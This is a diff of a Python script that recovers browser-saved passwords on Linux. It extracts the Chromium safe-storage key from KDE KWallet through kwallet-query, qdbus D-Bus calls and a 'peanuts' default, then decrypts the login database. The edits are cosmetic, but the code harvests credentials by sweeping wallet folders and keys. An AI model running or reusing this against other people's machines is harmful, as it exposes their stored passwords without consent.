@@ -2,8 +2,8 @@ import os, sqlite3, shutil, subprocess
 from hashlib import pbkdf2_hmac
 from Crypto.Cipher import AES
 
-# Maps browser name → (kwallet search hint, config path)
-# hint is used to fuzzy-match folder names in KWallet at runtime
+# Maps browser name -> (kwallet search hint, config path)
+# hint is fuzzy-matched against KWallet folder names at runtime
 BROWSER_CONFIG = {
     "chromium": ("chromium", "~/.config/chromium"),
     "chrome":   ("chrome",   "~/.config/google-chrome"),
@@ -80,21 +80,15 @@ def _discover_kwallet_secret(browser_hint):
     2. Listing all folders in the wallet
     3. Fuzzy-matching folders against the browser hint
     4. Iterating keys inside matched folders until one returns a value
-
-    No hardcoded folder or key names — works regardless of KDE version
-    or browser variant.
+    No hardcoded folder or key names.
     """
     wallet  = _get_wallet_name()
     folders = _list_wallet_folders(wallet)
-
     if not folders:
         return None
 
-    hint = browser_hint.lower()
-
-    # Match any folder whose name contains the browser hint (case-insensitive)
+    hint    = browser_hint.lower()
     matched = [f for f in folders if hint in f.lower()]
-
     if not matched:
         return None
 
@@ -104,7 +98,6 @@ def _discover_kwallet_secret(browser_hint):
             secret = _read_kwallet_key(wallet, folder, key)
             if secret:
                 return secret
-
     return None
 
 
@@ -115,7 +108,6 @@ def _get_secret_dbus_fallback(browser_hint):
     """
     for qdbus in ["qdbus", "qdbus6"]:
         try:
-            # Get wallet name
             res = subprocess.run(
                 [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                  "org.kde.KWallet.networkWallet"],
@@ -123,7 +115,6 @@ def _get_secret_dbus_fallback(browser_hint):
             )
             wallet_name = res.stdout.strip() or "kdewallet"
 
-            # Open handle
             res = subprocess.run(
                 [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                  "org.kde.KWallet.open", wallet_name, "0", "password_auditor"],
@@ -134,7 +125,6 @@ def _get_secret_dbus_fallback(browser_hint):
                 continue
             handle = int(handle)
 
-            # List folders
             res = subprocess.run(
                 [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                  "org.kde.KWallet.folderList", str(handle), "password_auditor"],
@@ -146,14 +136,12 @@ def _get_secret_dbus_fallback(browser_hint):
             ]
 
             for folder in folders:
-                # List keys in folder
                 res = subprocess.run(
                     [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                      "org.kde.KWallet.entryList", str(handle), folder, "password_auditor"],
                     capture_output=True, text=True, timeout=3
                 )
                 keys = [k.strip() for k in res.stdout.splitlines() if k.strip()]
-
                 for key in keys:
                     res = subprocess.run(
                         [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
@@ -163,7 +151,6 @@ def _get_secret_dbus_fallback(browser_hint):
                     )
                     if res.returncode == 0 and res.stdout.strip():
                         return res.stdout.strip().encode()
-
         except Exception:
             continue
     return None
@@ -207,7 +194,7 @@ def extract_browser_passwords(browser):
     except Exception as e:
         return [f"<copy failed: {e}>"]
 
-    # Discovery chain: kwallet-query → qdbus D-Bus → peanuts fallback
+    # Discovery chain: kwallet-query -> qdbus D-Bus -> peanuts fallback
     secret = _discover_kwallet_secret(hint) \
           or _get_secret_dbus_fallback(hint) \
           or b"peanuts"
